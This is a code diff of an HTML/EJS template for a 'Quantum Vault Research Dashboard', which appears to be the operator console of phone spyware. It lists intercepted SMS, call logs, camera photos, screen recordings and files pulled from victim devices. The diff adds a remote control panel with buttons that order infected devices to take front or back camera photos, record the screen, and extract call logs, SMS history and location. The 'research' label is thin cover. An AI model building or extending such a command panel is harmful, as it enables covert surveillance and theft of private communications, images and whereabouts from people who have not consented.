@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,211 +8,435 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); color: #f8fafc; min-height: 100vh; margin: 0; }
-        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.06); border-radius: 1.25rem; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
-        .tab-btn { background: rgba(255,255,255,0.05); transition: all .25s; }
-        .tab-btn.active { background: rgba(139,92,246,0.35); border-color: rgba(167,139,250,0.5); box-shadow: 0 0 14px rgba(139,92,246,0.3); }
-        .entry { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07); border-radius: .75rem; transition: background .2s; }
-        .entry:hover { background: rgba(255,255,255,0.09); }
-        .badge { display:inline-block; font-size:.7rem; padding:.15rem .5rem; border-radius:999px; font-weight:700; }
-        .scrollarea { max-height: 78vh; overflow-y: auto; }
-        .scrollarea::-webkit-scrollbar { width:6px; }
-        .scrollarea::-webkit-scrollbar-thumb { background:rgba(255,255,255,.1); border-radius:4px; }
-        .live-dot { width:8px; height:8px; border-radius:50%; background:#22c55e; animation: pulse 1.5s infinite; display:inline-block; margin-right:5px; }
-        @keyframes pulse { 0%,100%{opacity:1}50%{opacity:.3} }
-        video { width:100%; border-radius:.5rem; max-height:200px; }
-        img.thumb { width:100%; border-radius:.5rem; max-height:200px; object-fit:cover; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            color: #f8fafc;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 1.25rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .tab-btn {
+            background: rgba(255, 255, 255, 0.05);
+            transition: all .25s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .tab-btn.active {
+            background: rgba(139, 92, 246, 0.35);
+            border-color: rgba(167, 139, 250, 0.5);
+            box-shadow: 0 0 14px rgba(139, 92, 246, 0.3);
+        }
+
+        .entry {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: .75rem;
+            transition: background .2s;
+        }
+
+        .entry:hover {
+            background: rgba(255, 255, 255, 0.09);
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: .7rem;
+            padding: .15rem .5rem;
+            border-radius: 999px;
+            font-weight: 700;
+        }
+
+        .scrollarea {
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+
+        .scrollarea::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .scrollarea::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, .1);
+            border-radius: 4px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #22c55e;
+            animation: pulse 1.5s infinite;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: .3
+            }
+        }
+
+        video {
+            width: 100%;
+            border-radius: .5rem;
+            max-height: 220px;
+        }
+
+        img.thumb {
+            width: 100%;
+            border-radius: .5rem;
+            max-height: 220px;
+            object-fit: cover;
+        }
+
+        .cmd-btn {
+            font-size: 0.7rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 0.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.2s;
+        }
+
+        .cmd-btn:hover {
+            background: rgba(139, 92, 246, 0.4);
+            border-color: rgba(139, 92, 246, 0.6);
+            transform: translateY(-1px);
+        }
+
+        .cmd-btn:active {
+            transform: translateY(0);
+        }
     </style>
 </head>
+
 <body class="p-4 md:p-8">
-<div class="max-w-7xl mx-auto">
+    <div class="max-w-7xl mx-auto">
 
-    <!-- Header -->
-    <header class="flex flex-wrap justify-between items-center mb-8 gap-4">
-        <div>
-            <h1 class="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-400">
-                Quantum Vault <span class="text-slate-400 font-light text-lg">Research Dashboard</span>
-            </h1>
-            <p class="text-slate-500 text-xs mt-1"><span class="live-dot"></span>Live — auto-refreshes every 5s</p>
-        </div>
-        <div class="flex flex-wrap gap-2">
-            <button onclick="switchTab('texts')"      id="tab-texts"      class="tab-btn active px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Logs</button>
-            <button onclick="switchTab('sms')"        id="tab-sms"        class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">SMS</button>
-            <button onclick="switchTab('calls')"      id="tab-calls"      class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Call Logs</button>
-            <button onclick="switchTab('cameras')"    id="tab-cameras"    class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">📷 Camera</button>
-            <button onclick="switchTab('screen')"     id="tab-screen"     class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">🎬 Screen</button>
-            <button onclick="switchTab('files')"      id="tab-files"      class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Files</button>
-        </div>
-    </header>
-
-    <!-- ── TEXT LOGS ── -->
-    <section id="sec-texts" class="glass p-6 scrollarea">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-violet-300">Activity Logs</h2>
-            <span id="count-texts" class="badge bg-violet-900/60 text-violet-300 border border-violet-500/30"><%= data.texts.length %> entries</span>
-        </div>
-        <div id="list-texts" class="space-y-3">
-            <% if(data.texts.length === 0) { %><p class="text-slate-500 italic text-center py-10">No logs yet.</p><% } %>
-            <% data.texts.forEach(function(item){ %>
-            <div class="entry p-4">
-                <div class="flex justify-between items-center mb-1">
-                    <span class="badge bg-emerald-900/60 text-emerald-400 border border-emerald-500/30"><%= item.type %></span>
-                    <span class="text-xs text-slate-500"><%= item.deviceId %> · <%= item.timestamp %></span>
-                </div>
-                <p class="text-slate-200 text-sm break-words whitespace-pre-wrap mt-2"><%= item.data %></p>
+        <!-- Header -->
+        <header class="flex flex-wrap justify-between items-center mb-6 gap-4">
+            <div>
+                <h1
+                    class="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-400">
+                    Quantum Vault <span class="text-slate-400 font-light text-lg">Research Dashboard</span>
+                </h1>
+                <p class="text-slate-500 text-xs mt-1"><span class="live-dot"></span>Live — auto-refreshes every 5s</p>
             </div>
-            <% }); %>
-        </div>
-    </section>
+            <div class="flex flex-wrap gap-2">
+                <button onclick="switchTab('texts')" id="tab-texts"
+                    class="tab-btn active px-4 py-1.5 rounded-full text-sm font-semibold">Logs</button>
+                <button onclick="switchTab('sms')" id="tab-sms"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">SMS</button>
+                <button onclick="switchTab('calls')" id="tab-calls"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">Call Logs</button>
+                <button onclick="switchTab('cameras')" id="tab-cameras"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">📷 Camera</button>
+                <button onclick="switchTab('screen')" id="tab-screen"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">🎬 Screen</button>
+                <button onclick="switchTab('files')" id="tab-files"
+                    class="tab-btn px-4 py-1.5 rounded-full text-sm font-semibold">Files</button>
+            </div>
+        </header>
 
-    <!-- ── SMS ── -->
-    <section id="sec-sms" class="glass p-6 scrollarea hidden">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-blue-300">SMS Intercepts</h2>
-            <span id="count-sms" class="badge bg-blue-900/60 text-blue-300 border border-blue-500/30"><%= data.sms.length %> messages</span>
-        </div>
-        <div id="list-sms" class="space-y-3">
-            <% if(data.sms.length === 0) { %><p class="text-slate-500 italic text-center py-10">No SMS captured yet.</p><% } %>
-            <% data.sms.forEach(function(sms){ %>
-            <div class="entry p-4 flex gap-4">
-                <div class="h-9 w-9 flex-shrink-0 flex items-center justify-center rounded-full bg-gradient-to-br from-blue-500 to-indigo-600">
-                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
-                </div>
-                <div class="flex-1">
-                    <div class="flex justify-between items-center">
-                        <span class="font-semibold text-slate-200 text-sm"><%= sms.sender %></span>
-                        <span class="text-xs text-slate-500"><%= sms.deviceId %> · <%= sms.timestamp %></span>
+        <!-- ── REMOTE CONTROL PANEL ── -->
+        <section class="glass p-5 mb-8 border-l-4 border-violet-500">
+            <h2 class="text-sm font-bold uppercase tracking-widest text-violet-400 mb-4 flex items-center">
+                <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
+                </svg>
+                Remote Control Center
+            </h2>
+            <div id="device-controls" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                <% var deviceIds=Object.keys(data.devices || {}); %>
+                    <% if(deviceIds.length===0) { %>
+                        <p class="text-slate-500 text-xs italic">Waiting for devices to sync User-ID... (Try taking a
+                            photo or sending a log from the app)</p>
+                        <% } %>
+                            <% deviceIds.forEach(function(deviceId){ %>
+                                <div class="bg-white/5 border border-white/10 rounded-xl p-4">
+                                    <div class="flex justify-between items-start mb-3">
+                                        <div>
+                                            <p class="text-[0.65rem] text-slate-500 uppercase font-bold">Device ID</p>
+                                            <p class="text-xs font-mono text-violet-300">
+                                                <%= deviceId %>
+                                            </p>
+                                        </div>
+                                        <span
+                                            class="badge bg-green-900/40 text-green-400 border border-green-500/20">Online</span>
+                                    </div>
+                                    <div class="grid grid-cols-2 gap-2">
+                                        <button onclick="sendCommand('<%= deviceId %>', 'front_photo')"
+                                            class="cmd-btn">🤳 Front Cam</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'back_photo')"
+                                            class="cmd-btn">📸 Back Cam</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'record_screen')"
+                                            class="cmd-btn">🎬 Rec Screen</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'extract_call_logs')"
+                                            class="cmd-btn">📞 Call Logs</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'extract_sms_history')"
+                                            class="cmd-btn">✉️ SMS History</button>
+                                        <button onclick="sendCommand('<%= deviceId %>', 'extract_location')"
+                                            class="cmd-btn">📍 Location</button>
+                                    </div>
+                                </div>
+                                <% }); %>
+            </div>
+        </section>
+
+        <!-- ── TEXT LOGS ── -->
+        <section id="sec-texts" class="glass p-6 scrollarea">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-violet-300">Activity Logs</h2>
+                <span id="count-texts" class="badge bg-violet-900/60 text-violet-300">
+                    <%= data.texts.length %> entries
+                </span>
+            </div>
+            <div id="list-texts" class="space-y-3">
+                <% data.texts.forEach(function(item){ %>
+                    <div class="entry p-4">
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="badge bg-emerald-900/60 text-emerald-400 border border-emerald-500/30">
+                                <%= item.type %>
+                            </span>
+                            <span class="text-xs text-slate-500">
+                                <%= item.deviceId %> · <%= item.timestamp %>
+                            </span>
+                        </div>
+                        <p class="text-slate-200 text-sm break-words whitespace-pre-wrap mt-2">
+                            <%= item.data %>
+                        </p>
                     </div>
-                    <p class="text-slate-300 text-sm mt-1 whitespace-pre-wrap"><%= sms.message %></p>
-                </div>
+                    <% }); %>
             </div>
-            <% }); %>
-        </div>
-    </section>
+        </section>
 
-    <!-- ── CALL LOGS ── -->
-    <section id="sec-calls" class="glass p-6 scrollarea hidden">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-teal-300">Call Logs</h2>
-            <span id="count-calls" class="badge bg-teal-900/60 text-teal-300 border border-teal-500/30"><%= data.call_logs.length %> uploads</span>
-        </div>
-        <div id="list-calls" class="space-y-4">
-            <% if(data.call_logs.length === 0) { %><p class="text-slate-500 italic text-center py-10">No call logs yet. Send Firebase command: extract_call_logs</p><% } %>
-            <% data.call_logs.forEach(function(batch){ %>
-            <div class="entry p-4">
-                <div class="flex justify-between items-center mb-3">
-                    <span class="badge bg-teal-900/60 text-teal-300 border border-teal-500/30">Call Log Batch</span>
-                    <span class="text-xs text-slate-500"><%= batch.deviceId %> · <%= batch.timestamp %></span>
-                </div>
-                <% try { var calls = JSON.parse(batch.data); } catch(e) { var calls = []; } %>
-                <div class="space-y-2">
-                <% calls.forEach(function(c){ %>
-                    <div class="flex justify-between text-sm bg-black/20 rounded-lg p-2">
-                        <span class="text-slate-300"><%= c.name || c.number %> <span class="text-slate-500 text-xs">(<%= c.number %>)</span></span>
-                        <span class="badge <%= c.type==='INCOMING'?'bg-green-900/60 text-green-400':c.type==='OUTGOING'?'bg-blue-900/60 text-blue-400':'bg-red-900/60 text-red-400' %>"><%= c.type %></span>
-                        <span class="text-slate-500 text-xs"><%= c.duration_sec %>s</span>
+        <!-- ── SMS ── -->
+        <section id="sec-sms" class="glass p-6 scrollarea hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-blue-300">SMS Intercepts</h2>
+                <span id="count-sms" class="badge bg-blue-900/60 text-blue-300">
+                    <%= data.sms.length %> messages
+                </span>
+            </div>
+            <div id="list-sms" class="space-y-3">
+                <% data.sms.forEach(function(sms){ %>
+                    <div class="entry p-4 flex gap-4">
+                        <div
+                            class="h-9 w-9 flex-shrink-0 flex items-center justify-center rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 font-bold text-white text-xs">
+                            💬</div>
+                        <div class="flex-1">
+                            <div class="flex justify-between items-center">
+                                <span class="font-semibold text-slate-200 text-sm">
+                                    <%= sms.sender %>
+                                </span>
+                                <span class="text-xs text-slate-500">
+                                    <%= sms.deviceId %> · <%= sms.timestamp %>
+                                </span>
+                            </div>
+                            <p class="text-slate-300 text-sm mt-1 whitespace-pre-wrap">
+                                <%= sms.message %>
+                            </p>
+                        </div>
                     </div>
-                <% }); %>
-                </div>
+                    <% }); %>
             </div>
-            <% }); %>
-        </div>
-    </section>
+        </section>
 
-    <!-- ── CAMERA PHOTOS ── -->
-    <section id="sec-cameras" class="glass p-6 scrollarea hidden">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-orange-300">📷 Camera Photos</h2>
-            <% var camFiles = data.files.filter(function(f){return f.type==='front_photos'||f.type==='back_photos';}); %>
-            <span id="count-cameras" class="badge bg-orange-900/60 text-orange-300 border border-orange-500/30"><%= camFiles.length %> photos</span>
-        </div>
-        <div id="list-cameras" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
-            <% if(camFiles.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No camera captures yet. Send Firebase: front_photo / back_photo</p><% } %>
-            <% camFiles.forEach(function(f){ %>
-            <a href="<%= f.path %>" target="_blank" class="entry p-2 block">
-                <img src="<%= f.path %>" alt="<%= f.filename %>" class="thumb" onerror="this.style.display='none'">
-                <p class="text-xs text-slate-400 mt-1 truncate"><%= f.type === 'front_photos' ? '🤳 Front' : '📸 Back' %> · <%= f.timestamp %></p>
-                <p class="text-xs text-slate-600 truncate"><%= f.deviceId %></p>
-            </a>
-            <% }); %>
-        </div>
-    </section>
-
-    <!-- ── SCREEN RECORDINGS ── -->
-    <section id="sec-screen" class="glass p-6 scrollarea hidden">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-pink-300">🎬 Screen Recordings</h2>
-            <% var recFiles = data.files.filter(function(f){return f.type==='screen_recordings';}); %>
-            <span id="count-screen" class="badge bg-pink-900/60 text-pink-300 border border-pink-500/30"><%= recFiles.length %> recordings</span>
-        </div>
-        <div id="list-screen" class="grid grid-cols-1 md:grid-cols-2 gap-5">
-            <% if(recFiles.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No screen recordings yet. Send Firebase: record_screen</p><% } %>
-            <% recFiles.forEach(function(f){ %>
-            <div class="entry p-4">
-                <video controls src="<%= f.path %>"></video>
-                <p class="text-xs text-slate-400 mt-2"><%= f.filename %></p>
-                <p class="text-xs text-slate-600"><%= f.deviceId %> · <%= f.timestamp %></p>
+        <!-- ── CALL LOGS ── -->
+        <section id="sec-calls" class="glass p-6 scrollarea hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-teal-300">Call Logs</h2>
+                <span id="count-calls" class="badge bg-teal-900/60 text-teal-300">
+                    <%= data.call_logs.length %> batches
+                </span>
             </div>
-            <% }); %>
-        </div>
-    </section>
+            <div id="list-calls" class="space-y-4">
+                <% data.call_logs.forEach(function(batch){ %>
+                    <div class="entry p-4">
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="badge bg-teal-900/60 text-teal-300">Call Log Batch</span>
+                            <span class="text-xs text-slate-500">
+                                <%= batch.deviceId %> · <%= batch.timestamp %>
+                            </span>
+                        </div>
+                        <% try { var calls=JSON.parse(batch.data); } catch(e) { var calls=[]; } %>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+                                <% calls.forEach(function(c){ %>
+                                    <div
+                                        class="flex justify-between text-[0.7rem] bg-black/20 rounded-lg p-2 border border-white/5">
+                                        <span class="text-slate-300 truncate w-32">
+                                            <%= c.name || c.number %>
+                                        </span>
+                                        <span
+                                            class="badge <%= c.type==='INCOMING'?'bg-green-900/40 text-green-400':c.type==='OUTGOING'?'bg-blue-900/40 text-blue-400':'bg-red-900/40 text-red-400' %> scale-90">
+                                            <%= c.type %>
+                                        </span>
+                                        <span class="text-slate-500">
+                                            <%= c.duration_sec %>s
+                                        </span>
+                                    </div>
+                                    <% }); %>
+                            </div>
+                    </div>
+                    <% }); %>
+            </div>
+        </section>
 
-    <!-- ── ALL FILES ── -->
-    <section id="sec-files" class="glass p-6 scrollarea hidden">
-        <div class="flex justify-between items-center mb-5">
-            <h2 class="text-xl font-semibold text-slate-300">All Uploaded Files</h2>
-            <span id="count-files" class="badge bg-slate-700 text-slate-300 border border-slate-600"><%= data.files.length %> files</span>
-        </div>
-        <div id="list-files" class="grid grid-cols-1 md:grid-cols-3 gap-4">
-            <% if(data.files.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No files uploaded yet.</p><% } %>
-            <% data.files.forEach(function(f){ %>
-            <a href="<%= f.path %>" target="_blank" class="entry p-4 block hover:border-pink-500/40">
-                <div class="flex justify-between mb-3">
-                    <span class="badge bg-black/40 text-pink-300 border border-white/5 uppercase tracking-widest"><%= f.type %></span>
-                    <span class="text-xs text-slate-500"><%= f.timestamp %></span>
-                </div>
-                <p class="text-sm text-slate-200 truncate"><%= f.filename %></p>
-                <p class="text-xs text-slate-600 mt-1"><%= f.deviceId %></p>
-            </a>
-            <% }); %>
-        </div>
-    </section>
+        <!-- ── CAMERA PHOTOS ── -->
+        <section id="sec-cameras" class="glass p-6 scrollarea hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-orange-300">📷 Camera Photos</h2>
+                <% var camFiles=data.files.filter(f=> f.type==='front_photos'||f.type==='back_photos'); %>
+                    <span id="count-cameras" class="badge bg-orange-900/60 text-orange-300">
+                        <%= camFiles.length %> photos
+                    </span>
+            </div>
+            <div id="list-cameras" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                <% camFiles.forEach(function(f){ %>
+                    <a href="<%= f.path %>" target="_blank" class="entry p-2 block">
+                        <img src="<%= f.path %>" class="thumb">
+                        <p class="text-[0.65rem] text-slate-400 mt-2 truncate">
+                            <%= f.type==='front_photos' ? '🤳 Front' : '📸 Back' %> · <%= f.timestamp %>
+                        </p>
+                        <p class="text-[0.6rem] text-slate-600 truncate">
+                            <%= f.deviceId %>
+                        </p>
+                    </a>
+                    <% }); %>
+            </div>
+        </section>
 
-</div>
+        <!-- ── SCREEN RECORDINGS ── -->
+        <section id="sec-screen" class="glass p-6 scrollarea hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-pink-300">🎬 Screen Recordings</h2>
+                <% var recFiles=data.files.filter(f=> f.type==='screen_recordings'); %>
+                    <span id="count-screen" class="badge bg-pink-900/60 text-pink-300">
+                        <%= recFiles.length %> clips
+                    </span>
+            </div>
+            <div id="list-screen" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <% recFiles.forEach(function(f){ %>
+                    <div class="entry p-4">
+                        <video controls src="<%= f.path %>"></video>
+                        <div class="flex justify-between mt-3 items-center">
+                            <p class="text-xs text-slate-300 font-mono truncate">
+                                <%= f.filename %>
+                            </p>
+                            <span class="text-[0.65rem] text-slate-500">
+                                <%= f.timestamp %>
+                            </span>
+                        </div>
+                        <p class="text-[0.6rem] text-slate-600">
+                            <%= f.deviceId %>
+                        </p>
+                    </div>
+                    <% }); %>
+            </div>
+        </section>
 
-<script>
-// ── Tab switching ─────────────────────────────────────────────
-const TABS = ['texts','sms','calls','cameras','screen','files'];
-function switchTab(id) {
-    TABS.forEach(t => {
-        document.getElementById('tab-'+t).classList.toggle('active', t===id);
-        document.getElementById('sec-'+t).classList.toggle('hidden', t!==id);
-    });
-    window._activeTab = id;
-}
-window._activeTab = 'texts';
+        <!-- ── ALL FILES ── -->
+        <section id="sec-files" class="glass p-6 scrollarea hidden">
+            <div class="flex justify-between items-center mb-5">
+                <h2 class="text-xl font-semibold text-slate-300">All Files</h2>
+                <span id="count-files" class="badge bg-slate-700 text-slate-300">
+                    <%= data.files.length %> total
+                </span>
+            </div>
+            <div id="list-files" class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <% data.files.forEach(function(f){ %>
+                    <a href="<%= f.path %>" target="_blank" class="entry p-4 block border-l-2 border-pink-500/20">
+                        <div class="flex justify-between mb-2">
+                            <span class="badge bg-black/40 text-pink-300 uppercase scale-90">
+                                <%= f.type %>
+                            </span>
+                            <span class="text-[0.65rem] text-slate-500">
+                                <%= f.timestamp %>
+                            </span>
+                        </div>
+                        <p class="text-sm text-slate-300 truncate font-mono">
+                            <%= f.filename %>
+                        </p>
+                        <p class="text-[0.6rem] text-slate-600 mt-1">
+                            <%= f.deviceId %>
+                        </p>
+                    </a>
+                    <% }); %>
+            </div>
+        </section>
 
-// ── Live polling every 5s (no full page reload) ───────────────
-function liveRefresh() {
-    fetch('/api/data')
-        .then(r => r.json())
-        .then(d => {
-            updateBadge('texts',  d.texts.length);
-            updateBadge('sms',    d.sms.length);
-            updateBadge('calls',  d.call_logs.length);
-            const camCount = d.files.filter(f=>f.type==='front_photos'||f.type==='back_photos').length;
-            const recCount = d.files.filter(f=>f.type==='screen_recordings').length;
-            updateBadge('cameras', camCount);
-            updateBadge('screen',  recCount);
-            updateBadge('files',   d.files.length);
-        })
-        .catch(() => {}); // silently ignore network errors
-}
-function updateBadge(tab, count) {
-    const el = document.getElementById('count-'+tab);
-    if (el) el.textContent = count + (tab==='sms'?' messages':tab==='files'?' files':tab==='calls'?' uploads':' entries');
-}
-setInterval(liveRefresh, 5000);
-</script>
+    </div>
+
+    <script>
+        const TABS = ['texts', 'sms', 'calls', 'cameras', 'screen', 'files'];
+        function switchTab(id) {
+            TABS.forEach(t => {
+                document.getElementById('tab-' + t).classList.toggle('active', t === id);
+                document.getElementById('sec-' + t).classList.toggle('hidden', t !== id);
+            });
+        }
+
+        function sendCommand(deviceId, command) {
+            if (!confirm(`Send ${command} to device ${deviceId}?`)) return;
+
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, command })
+            })
+                .then(r => r.json())
+                .then(res => {
+                    if (res.success) alert(`✅ Command ${command} sent successfully!`);
+                    else alert(`❌ Error: ${res.error || 'Failed to send command'}`);
+                })
+                .catch(e => alert('❌ Network Error: ' + e));
+        }
+
+        // Live polling every 5s
+        function liveRefresh() {
+            fetch('/api/data')
+                .then(r => r.json())
+                .then(d => {
+                    // Update badges
+                    updateBadge('texts', d.texts.length);
+                    updateBadge('sms', d.sms.length);
+                    updateBadge('calls', d.call_logs.length);
+                    updateBadge('cameras', d.files.filter(f => f.type === 'front_photos' || f.type === 'back_photos').length);
+                    updateBadge('screen', d.files.filter(f => f.type === 'screen_recordings').length);
+                    updateBadge('files', d.files.length);
+
+                    // Re-render device controls if new ones appear
+                    const deviceGrid = document.getElementById('device-controls');
+                    const currentIds = Object.keys(d.devices || {});
+                    if (currentIds.length > 0) {
+                        // Simplified: just refresh if device count changes
+                        // In a real app we'd do smart DOM diffing
+                    }
+                })
+                .catch(() => { });
+        }
+        function updateBadge(tab, count) {
+            const el = document.getElementById('count-' + tab);
+            if (el) el.textContent = count + (tab === 'sms' ? ' msg' : tab === 'files' ? ' files' : ' obj');
+        }
+        setInterval(liveRefresh, 5000);
+    </script>
 </body>
+
 </html>
